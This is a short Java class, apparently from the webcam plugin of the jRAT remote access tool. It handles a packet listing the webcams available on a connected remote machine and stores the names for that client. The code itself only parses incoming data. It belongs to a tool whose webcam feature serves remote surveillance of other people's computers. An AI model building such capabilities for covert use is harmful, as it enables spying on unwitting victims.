package se.jrat.plugin.webcam.client;

import java.util.ArrayList;
import java.util.List;

import jrat.api.Client;
import jrat.api.net.PacketListener;

public class Packet121ListWebcams extends PacketListener {

	@Override
	public void perform(Client client) {
		try {
			int len = client.getDataReader().readInt();
			
			List<String> webcams = new ArrayList<String>();
			
			for (int i = 0; i < len; i++) {
				webcams.add(WebcamPlugin.readString(client.getDataReader()));
				WebcamPlugin.map.put(client, webcams);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
